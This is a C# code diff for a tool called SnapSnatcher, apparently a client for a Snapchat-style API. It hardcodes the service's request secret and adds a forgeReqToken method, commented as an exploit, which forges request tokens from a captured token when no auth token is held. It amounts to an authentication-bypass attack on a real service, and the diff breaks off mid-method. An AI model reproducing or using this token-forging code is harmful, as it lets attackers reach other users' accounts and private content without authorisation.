@@ -15,6 +15,7 @@ namespace SnapSnatcher
     {
         protected string username;
         protected string authToken;
+        protected string reqToken;
         const string BASE_URL = "https://feelinsonice-hrd.appspot.com/bq";
         const string VERSION = "4.1.07";
         const string SECRET = "iEk21fuwZApXlz93750dmW22pw389dPwOk";
@@ -79,6 +80,20 @@ namespace SnapSnatcher
 
         protected string getReqToken(string timestamp)
         {
+            if (string.IsNullOrEmpty(this.authToken))
+            {
+                //forge from req token (exploit)
+                return this.forgeReqToken(timestamp);
+            }
+            else
+            {
+                //build from authToken (the normal way)
+                return this.buildReqToken(timestamp);
+            }
+        }
+
+        protected string buildReqToken(string timestamp)
+        {
             string tok = this.authToken;
             if (string.IsNullOrEmpty(tok))
             {
@@ -97,6 +112,28 @@ namespace SnapSnatcher
                 if (c == '0')
                 {
                     token.Append(first[i]);
+                }
+                else
+                {
+                    token.Append(second[i]);
+                }
+            }
+            return token.ToString();
+        }
+
+        public string forgeReqToken(string timestamp)
+        {
+            string second = string.Format("{0}{1}", timestamp, SECRET);
+
+            second = Sha256(second);
+
+            StringBuilder token = new StringBuilder();
+            for (int i = 0; i < PATTERN.Length; i++)
+            {
+                char c = PATTERN[i];
+                if (c == '0')
+                {
+                    token.Append(this.reqToken[i]);
                 }
                 else
                 {
